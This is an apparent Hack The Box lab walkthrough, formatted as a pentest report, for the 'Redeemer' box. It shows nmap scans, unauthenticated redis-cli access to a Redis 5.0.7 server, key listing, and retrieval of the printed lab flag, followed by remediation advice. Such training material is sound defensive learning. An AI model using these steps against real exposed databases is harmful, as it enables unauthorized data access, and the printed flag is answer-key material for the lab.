# HTB Starting Point Lab Walkthrough: Redeemer (Linux Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit a Redis service on the target machine to retrieve a flag, simulating unauthenticated database access.
- **Target IP**: 10.129.13.96
- **Key Findings**: Identified an open Redis 5.0.7 instance on port 6379 with no authentication, allowing full access to database contents, including a sensitive flag in database 0.
- **Impact**: In a real-world scenario, unauthenticated Redis access could lead to data exposure, modification, or malicious command execution, risking system integrity.
- **Recommendations**: Enable authentication, restrict network access to trusted hosts, and secure Redis configuration files.
- **Completion Date**: July 7, 2025
- **Tools Used**: Nmap, redis-cli (on Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and exploitation process for the HTB Starting Point lab "Redeemer." The scope was limited to port scanning, Redis service enumeration, and data access on the provided target IP. No advanced exploitation or privilege escalation was required.

Steps were performed in a controlled lab environment using default Kali tools. Assumptions: Target is a Linux machine running Redis 5.0.7. Recent discussions on X and Redis security guidelines highlight common misconfigurations like unauthenticated access, relevant to this lab.

## Findings

### Finding 1: Open Port and Redis Service Identification

- **Description**: Redis, an in-memory key-value database, was found running on port 6379. A full port scan confirmed only one open TCP port.
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a full port scan using Nmap:
        
        ```bash
        nmap -p- -T5 10.129.13.96
        ```
        
        **Flag Explanation**: `-p-` scans all 65,535 TCP ports; `-T5` sets maximum scan speed (less stealthy but faster).  
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 19:24 EDT
        Warning: 10.129.13.96 giving up on port because retransmission cap hit (2).
        Nmap scan report for 10.129.13.96
        Host is up (0.020s latency).
        Not shown: 63867 closed tcp ports (reset), 1667 filtered tcp ports (no-response)
        PORT     STATE SERVICE
        6379/tcp open  redis
        Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds
        ```
        
    2. Confirm service version on port 6379:
        
        ```bash
        nmap -sV -p 6379 10.129.13.96
        ```
        
        **Flag Explanation**: `-sV` enables version detection; `-p 6379` targets the specific port.  
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 19:37 EDT
        Nmap scan report for 10.129.13.96
        Host is up (0.020s latency).
        PORT     STATE SERVICE VERSION
        6379/tcp open  redis   Redis key-value store 5.0.7
        Nmap done: 1 IP address (1 host up) scanned in 6.34 seconds
        ```
        
- **Impact**: Confirms Redis is active and identifies the version, enabling targeted enumeration.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: Unauthenticated Redis Access

- **Description**: The Redis 5.0.7 server allows unauthenticated connections, granting full access to database 0, which contains four keys.
- **Severity**: Critical (unauthenticated database access).
- **Steps to Reproduce**:
    1. Connect to the Redis server using redis-cli:
        
        ```bash
        redis-cli -h 10.129.13.96 -p 6379
        ```
        
        **Flag Explanation**: `-h 10.129.13.96` specifies the target hostname; `-p 6379` specifies the port.  
        Output:
        
        ```bash
        10.129.13.96:6379> 
        ```
        
    2. Select database 0 and check its size:
        
        ```bash
        select 0
        dbsize
        ```
        
        Output:
        
        ```bash
        OK
        (integer) 4
        ```
        
    3. List all keys in the database:
        
        ```bash
        keys *
        ```
        
        Output:
        
        ```bash
        1) "numb"
        2) "flag"
        3) "temp"
        4) "stor"
        ```
        
- **Impact**: Unauthenticated access allows full read/write control over the database, risking data exposure or manipulation.
- **Evidence**: Redis-cli output above.
- **Remediation**: Enable authentication with the `requirepass` directive in `redis.conf`; restrict access to trusted IPs.

### Finding 3: Data Exfiltration from Redis Database

- **Description**: Retrieved a sensitive flag from the `flag` key in database 0 using the `get` command.
- **Severity**: Critical (successful data exfiltration).
- **Steps to Reproduce**:
    1. Connect to Redis and select database 0:
        
        ```bash
        redis-cli -h 10.129.13.96 -p 6379
        select 0
        ```
        
        **Flag Explanation**: `-h 10.129.13.96` specifies the target hostname; `-p 6379` specifies the port.  
        Output:
        
        ```bash
        OK
        ```
        
    2. List all keys:
        
        ```bash
        keys *
        ```
        
        Output:
        
        ```bash
        1) "numb"
        2) "flag"
        3) "temp"
        4) "stor"
        ```
        
    3. Retrieve the flag value:
        
        ```bash
        get "flag"
        ```
        
        Output:
        
        ```bash
        "03e1d2b376c37ab3f5319922053953eb"
        ```
        
- **Impact**: Access to sensitive data demonstrates a real-world data breach scenario, potentially exposing critical information.
- **Evidence**: Command outputs and flag value above.
- **Remediation**: Remove sensitive data from Redis; implement access controls and encryption for stored values.

## Recommendations

- Enable authentication in Redis by setting `requirepass` in `redis.conf` and using strong passwords.
- Restrict network access to port 6379 using firewall rules, allowing only trusted hosts.
- Regularly scan for exposed Redis instances using tools like Nmap or Redis-specific scripts (e.g., `redis-info.nse`).
- For labs like this, explore Redis exploitation with tools like Metasploit’s `redis_server` module to test for misconfigurations.

## Appendices

- **Raw Notes/Logs**: (Optional—attach full session logs if sharing.)
- **Screenshots**: (Add here if available, e.g., terminal captures.)
- **Key Takeaway**: Redis misconfigurations, such as unauthenticated access, are common vulnerabilities. Checking `redis.conf` for `requirepass` and network exposure is critical, as noted in recent X posts and Redis security guidelines.